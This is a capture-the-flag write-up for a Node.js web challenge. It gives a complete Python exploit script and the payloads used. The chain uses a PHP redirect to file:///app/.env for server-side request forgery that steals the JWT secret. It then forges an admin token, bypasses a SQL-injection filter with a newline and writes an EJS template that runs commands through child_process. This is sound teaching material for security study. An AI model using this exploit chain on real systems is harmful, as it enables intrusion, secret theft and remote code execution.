### Challenge Description

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8997e03a-1018-4622-ad58-8440573c4af4)

## Enumeration

We start by doing some static source code analysis. Because we see it building a `readflag` binary in the Dockerfile, we know that we will need to get RCE to get the flag:  

```text
# Setup readflag
COPY config/readflag.c /
RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c
```

In `/app/.env/` we have a secret that we will need to steal:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/ede16d10-3315-4d5c-96f4-7a31dab584b6)

The `authController.js` has a function that by default generates a JWT token with a "user" role:  

```js
function generateGuestToken(req, res, next) {
    const payload = {
        role: 'user'
    };

    jwt.sign(payload, secret, (err, token) => {
        if (err) {
            next(generateError(500, "Failed to generate token."));;
        } else {
            res.send(token);
        }
    });
}
```
However, there's a check for the "admin" role as well:  

```js
const authMiddleware = (requiredRole) => {
    return (req, res, next) => {
        const token = req.query.token;

        if (!token) {
            return next(generateError(401, "Access denied. Token is required."));
        }

        const role = verifyToken(token);

        if (!role) {
            return next(generateError(401, "Invalid or expired token."));
        }

        if (requiredRole === "admin" && role !== "admin") {
            return next(generateError(401, "Unauthorized."));
        } else if (requiredRole === "admin" && role === "admin") {
            if (!checkInternal(req)) {
                return next(generateError(403, "Only available for internal users!"));
            }
        }

        next();
    };
};
```

The `security.js` from utils has checks in place to "filter" SQL injections and SSRFs.

```js
function detectSqli (query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
    return pattern.test(query)
}

function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '')
    return address === "127.0.0.1"
}

function isUrl(url) {
    try {
      new URL(url);
      return true;
    } catch (err) {
      return false;
    }
  };
```
In the schemas folder there's a `schema.js` showing us two GraphQL queries. One of which seems vulnerable to SQL injection but it is using the above filter:  

```js
//<..snipped for brevity..>
getDataByName: {
      type: new GraphQLList(UserType),
      args: {
        name: { type: GraphQLString }
      },
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        console.log(args.name)
        if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows => rows[0]);
        } catch (error) {
            return generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    }
  }
});
```
From the `downloadController.js` and the Dockerfile we can tell that it is using `wkhtmltopdf` to generate PDFs. 

```js
//<..snipped for brevity..>
async function convertPdf(req, res, next) {
    try {
        const { url } = req.body;

        if (!isUrl(url)) {
            return next(generateError(400, "Invalid URL"));
        }

        const pdfPath = await generatePdf(url);
        res.sendFile(pdfPath, {root: "."});

    } catch (error) {
        return next(generateError(500, error.message));
    }
}
```

In the `errorController.js` we see a function handling the error rendering. If the http status code is 400 or larger but smaller than 600 then it tries to find the corresponding `ejs` template in the "views/errors" directory. If it doesn't find a corresponding template it just renders error.ejs.

```js
const renderError = (err, req, res) => {
    res.status(err.status);
    const templateDir = __dirname + '/../views/errors';
    const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"
    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);

    if (!fs.existsSync(templatePath)) {
        templatePath = path.join(templateDir, `error.ejs`);
    }
    console.log(templatePath)
    res.render(templatePath, { error: err.message }, (renderErr, html) => {
        res.send(html);
    });
};
```
But we can see in the source code that there are templates only for certain status codes. This will be important at the end.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/7a873703-4875-4409-a6a1-edb7c24911a9)


Putting it all together, this means we will need to do the following things in this order:

1. Get a guest/user JWT.
2. Bypass the `isURL` filter to get the secret via SSRF redirect.
3. Forge an admin JWT.
4. Bypasss the `checkInternal` to access the /graphql endpoint.
5. Bypass the `detectSqli` to perform SQL injection and write a file on disk.
6. Write a `404.ejs` template with our own template code to execute commands and read the flag.

## Solution

1. Doing the first step is easy. A regular GET request to /getToken gives us a user JWT to work with.
2. Because of the `isURL` filter, we can't simply use "file:///app/.env" to get the content via SSRF. But what we can do, is host a PHP script with the content below and server it on a PHP webserver.

   ```php
   <?php header('location:file:///app/.env'); ?>
   ```
   Now when the server will try to access our page, it will get redirected to the location we want and the `wkhtmltopdf` library will print our result.
3. Now that we have the secret, forging an admin token is easy. Code below.
4. You can't access the /graphql endpoint directly but that's why we have the SSRF, we'll just use that.
5. Bypassing the `detectSqli` regex is easy, we just use a newline: `\n`
6. This part took us the longest. We couldn't figure out what to do with the SQLi because it's a NodeJS application and you can't overwrite files, so you can't change the source code. But a closer look at the `errorController.js` and the views/errors directory revealed that the developer "forgot" that there are other status codes that can be triggered. Notice that there is no template for 404... so what would happen if we just add our own and then trigger a 404 status code?!

```python3
import requests
import pdfplumber
import os
import jwt


target = 'http://127.0.0.1:1337' #replace with actual target
hosted_SSRF_redirect = 'http://127.0.0.1' #replace with your VPS IP hosting the PHP redirect

getToken_url = f'http://{target}/getToken'
r = requests.get(getToken_url)
guestToken = r.content.decode()

def ssrf_func(token, target, user_input):
        url = f'http://{target}/download?token={token}'
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        data=f'url={user_input}'
        r = requests.post(url, headers=headers, data=data)
        reader = r.content

        with open('/tmp/pdf.pdf', 'wb') as fp:
                newpdf = fp.write(reader)

        with pdfplumber.open('/tmp/pdf.pdf') as pdf:
            first_page = pdf.pages[0]
            text = first_page.extract_text()
            lines = text.split('\n')

        os.unlink('/tmp/pdf.pdf')
        return lines

secret = ssrf_func(guestToken, target, hosted_SSRF_redirect)[5].replace('secret=','')

def modify_jwt(guest_jwt, secret):
    decoded_jwt = jwt.decode(guest_jwt, secret, algorithms=['HS256'])
    decoded_jwt['role'] = 'admin'
    modified_jwt = jwt.encode(decoded_jwt, secret, algorithm='HS256')

    return modified_jwt

adminToken = modify_jwt(guestToken, secret)

SQLi_payload = '''\\n' union select NULL,NULL,NULL,0x3c21444f43545950452068746d6c3e0d0a3c68746d6c206c616e673d22656e223e0d0a20203c686561643e0d0a202020203c6d65746120636861727365743d225554462d38223e0d0a202020203c6d657461206e616d653d2276696577706f72742220636f6e74656e743d2277696474683d6465766963652d77696474682c20696e697469616c2d7363616c653d312e30223e0d0a202020203c7469746c653e556e617574686f72697a65643c2f7469746c653e0d0a202020203c7374796c653e0d0a2020202020202e6572726f722d636f6e7461696e6572207b0d0a2020202020202020746578742d616c69676e3a2063656e7465723b0d0a2020202020207d0d0a0d0a2020202020206831207b0d0a2020202020202020636f6c6f723a20236630303b0d0a2020202020207d0d0a202020203c2f7374796c653e0d0a202020203c6c696e6b2072656c3d227374796c6573686565742220687265663d222f7374617469632f6373732f7374796c652e637373223e0d0a20203c2f686561643e0d0a20203c626f64793e0d0a202020203c64697620636c6173733d226f7665726c6179223e3c2f6469763e0d0a202020203c64697620636c6173733d2277726170706572223e0d0a202020202020203c64697620636c6173733d22636f6e74656e7420636c656172666978223e0d0a20202020202020203c64697620636c6173733d226572726f722d636f6e7461696e6572207369746520636c656172223e0d0a202020202020202020203c68313e4c617a79546974616e20676574732074686520666c61673c2f68313e0d0a202020202020202020203c703e3c253d2070726f636573732e6d61696e4d6f64756c652e7265717569726528276368696c645f70726f6365737327292e6578656353796e6328272f72656164666c616727292e746f537472696e67282920253e203c2f703e0d0a20202020202020203c2f6469763e0d0a2020202020203c2f6469763e0d0a2020202020203c7020636c6173733d22636c656172223e0d0a20202020202020203c62723e0d0a2020202020203c2f703e0d0a202020203c2f6469763e0d0a202020203c2f6469763e0d0a20203c2f626f64793e0d0a20203c2f626f64793e0d0a3c2f68746d6c3e into dumpfile '/app/views/errors/404.ejs'; -- -''' #write file
SSRF_data=f'http://127.0.0.1:1337/graphql?token={adminToken}%26query={{getDataByName(name:"{SQLi_payload}"){{name}}}}'

print(ssrf_func(adminToken, target, SSRF_data))
```
For the `404.ejs` file we wrote, we just copied the 401.ejs and replaced the error output with our code. You can hex decode it from the script above to see it in full.

```js
<%= process.mainModule.require('child_process').execSync('/readflag').toString() %>
```

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0253887b-0e93-44b5-a2b6-0767b074ecca)


`HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_fe2915a8458e99d3bf115dcdd431c156}`

# Note: This was a very interesting challenge that felt realistic. Not a big codebase but with standard developer errors in all of the controllers. 
